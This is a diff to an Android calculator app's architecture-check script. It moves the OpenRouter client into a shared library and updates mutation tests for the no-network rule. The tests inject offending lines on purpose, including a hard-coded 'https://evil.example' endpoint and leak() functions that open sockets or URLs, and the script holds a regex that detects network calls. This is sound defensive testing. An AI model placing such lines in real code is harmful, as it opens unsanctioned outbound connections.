@@ -17,10 +17,10 @@
 #   C5  the engine stays an engine: no gradle file, settings or module map of this
 #       app names libs:calc, and no app source loads a native library — every
 #       calculation crosses to Cloud-Lib-Calc.
-#   C6  the network is one file: no app or jev/ source opens a URL or a socket except
-#       jev/…/Decisions.kt (#770, OpenRouter for the Jev section), and that file spells no URL —
-#       every address it opens comes from build.json::jev. The engine's rate download stays in
-#       libs:calc.
+#   C6  no app or jev/ source opens a URL or a socket: OpenRouter's Decisions client is
+#       libs:decisions (#772, shared with the image engine), and jev/…/Decisions.kt — the only
+#       file that hands it an address — spells no URL: every address comes from build.json::jev.
+#       The engine's rate download stays in libs:calc.
 #   C7  the debug API registers eval, modes and info under build.json::ui.debug_api.group.
 #   C8  #768 the Clock's platform contract, in the manifest: exact alarms by the alarm-clock
 #       path (USE_EXACT_ALARM; SCHEDULE_EXACT_ALARM capped at API 32), a non-exported receiver
@@ -145,11 +145,9 @@ for p in kts:
 net = re.compile(r"java\.net\.|HttpURLConnection|okhttp3|\bSocket\(|URL\(")
 decisions = os.path.join(jsrc, "Decisions.kt")
 for p in kts + jkts:
-    if p == decisions:
-        continue
     hit = net.search(code(p))
     if hit:
-        bad.append("C6 %s uses the network (%s) — jev/Decisions.kt is the app's only network code" % (os.path.basename(p), hit.group(0)))
+        bad.append("C6 %s uses the network (%s) — the app opens nothing itself; libs:decisions is the Decisions client" % (os.path.basename(p), hit.group(0)))
 if os.path.isfile(decisions) and re.search(r'"[a-z]+://', code(decisions)):
     bad.append("C6 jev/Decisions.kt spells a URL — every address it opens must come from build.json::jev")
 
@@ -328,7 +326,8 @@ mutate native-in-app "$J/Logic.kt" 's + "\nprivate object Q { init { System.load
 mutate app-online "$J/Logic.kt" 's + "\nprivate val u = java.net.URL(\"https://example.org\")\n"' "C6 Logic.kt uses the network"
 JV='jev/src/main/kotlin/com/diegonmarcos/cloudcalc/jev'
 mutate router-online "$JV/JevRouter.kt" 's + "\nprivate fun leak() = java.net.Socket(\"x\", 1)\n"' "C6 JevRouter.kt uses the network"
-mutate url-in-decisions "$JV/Decisions.kt" 's.replace("fun send(url: String, token: String?, body: String?, timeoutMs: Int): Response", "fun send(url: String = \"https://evil.example\", token: String?, body: String?, timeoutMs: Int): Response")' "C6 jev/Decisions.kt spells a URL"
+mutate url-in-decisions "$JV/Decisions.kt" 's.replace("post(cfg.endpoint, cfg.timeoutMs,", "post(\"https://evil.example\", cfg.timeoutMs,")' "C6 jev/Decisions.kt spells a URL"
+mutate decisions-online "$JV/Decisions.kt" 's + "\nprivate fun leak() = java.net.URL(\"x\").openConnection()\n"' "C6 Decisions.kt uses the network"
 mutate section-without-tab build.json 's.replace("\"section\": \"measure\"", "\"section\": \"calculator\"")' "C1 section measure has no tab"
 mutate tab-orphan-section build.json 's.replace("\"section\": \"jev\"", "\"section\": \"nowhere\"", 1)' "names section nowhere"
 mutate section-icon build.json 's.replace("\"icon\": \"psychology\"", "\"icon\": \"psycho\"")' "C3 tab jev icon"
